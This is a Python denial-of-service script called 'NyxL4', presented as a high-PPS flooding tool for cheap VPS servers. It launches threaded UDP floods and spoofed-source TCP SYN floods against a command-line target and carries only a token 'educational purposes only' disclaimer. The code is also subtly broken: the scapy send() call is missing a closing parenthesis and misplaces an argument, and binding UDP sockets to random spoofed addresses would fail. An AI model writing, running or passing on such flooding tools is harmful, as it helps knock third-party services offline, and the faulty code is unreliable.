#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# TITLE: **NyxL4** - Ultra-Stable High-PPS DDoS Tool for Low-End VPS  
# AUTHOR: *Adapted from MedusaL4 w/ ZeroXScr modifications*  
# WARNING: For educational purposes only. Misuse violates international laws.

import socket
import threading
import random
import time
import sys
import os
from scapy.all import *
from colorama import Fore, init, Style

# ===== [CONFIGURATION] =====
MAX_PACKET_RATE = 50000  # Packets/second (adjust for 2GB RAM)
SPOOF_INTERVAL = 0.5     # IP rotation frequency (seconds)
THREAD_SLEEP = 0.001      # Prevents thread starvation

# ===== [ENGINE OPTIMIZATION] =====
init(autoreset=True)
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')  # Kernel tweak

# ===== [BANNER] =====
banner = f"""
{Fore.RED}SAXIOS SAXIOS SAXIOS SAXIOS ATTACK
{Style.RESET_ALL}>> NYX L4 ENGINE v3.14 << | {Fore.YELLOW}VPS MODE: 2GB RAM/1 CORE{Style.RESET_ALL}
"""
print(banner)

# ===== [SPOOFING ENGINE] =====
class Spoofer:
    @staticmethod
    def generate_ips(count=1000):
        """Dynamically generate spoofed IPs to evade blacklists"""
        return [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" 
                for _ in range(count)]

    @staticmethod
    def random_port():
        return random.randint(1, 65535)

# ===== [ATTACK MODULES] =====
class UDPArmageddon:
    def __init__(self):
        self.counter = 0
        self.last_print = time.time()

    def flood(self, target_ip, target_port, duration, pps):
        end_time = time.time() + duration
        payload = random._urandom(1024)  # Optimized for Gbit links
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind((Spoofer.generate_ips(1)[0], Spoofer.random_port()))
                
                # Batch sending for higher PPS
                for _ in range(min(pps//10, 1000)):  # Prevents OOM errors
                    sock.sendto(payload, (target_ip, target_port))
                    self.counter += 1
                
                # Real-time stats
                if time.time() - self.last_print > 1:
                    print(f"{Fore.CYAN}[UDP-NYX]{Style.RESET_ALL} PPS: {self.counter} | Target: {target_ip}:{target_port}")
                    self.counter = 0
                    self.last_print = time.time()
                    
            except Exception as e:
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {e}")
                time.sleep(THREAD_SLEEP)

class TCPSynPlague:
    def __init__(self):
        self.sent = 0

    def flood(self, target_ip, target_port, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                send(
                    IP(src=Spoofer.generate_ips(1)[0], dst=target_ip)/
                    TCP(sport=Spoofer.random_port(), dport=target_port, flags="S", 
                        window=random.randint(100, 65535), 
                    verbose=0
                )
                self.sent += 1
                if self.sent % 1000 == 0:
                    print(f"{Fore.GREEN}[TCP-NYX]{Style.RESET_ALL} SYN Packets: {self.sent}")
            except:
                pass

# ===== [MAIN CONTROLLER] =====
def attack_controller():
    if len(sys.argv) != 6:
        print(f"{Fore.YELLOW}Usage:{Style.RESET_ALL} {sys.argv[0]} <IP> <PORT> <DURATION(sec)> <PPS> <THREADS>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    pps = int(sys.argv[4])
    threads = int(sys.argv[5])

    print(f"{Fore.RED}>>> [NYX ACTIVATED] <<<{Style.RESET_ALL}")
    print(f"Target: {Fore.MAGENTA}{target_ip}:{target_port}{Style.RESET_ALL}")
    print(f"Params: {duration}s @ {pps} PPS | Threads: {threads}")

    # Thread launcher
    for _ in range(threads):
        udp_thread = threading.Thread(target=UDPArmageddon().flood, 
                                     args=(target_ip, target_port, duration, pps//threads))
        tcp_thread = threading.Thread(target=TCPSynPlague().flood,
                                    args=(target_ip, target_port, duration))
        udp_thread.daemon = True
        tcp_thread.daemon = True
        udp_thread.start()
        tcp_thread.start()

    # Keep main thread alive
    while threading.active_count() > 1:
        time.sleep(1)

if __name__ == "__main__":
    try:
        attack_controller()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}>>> [NYX TERMINATED] <<<{Style.RESET_ALL}")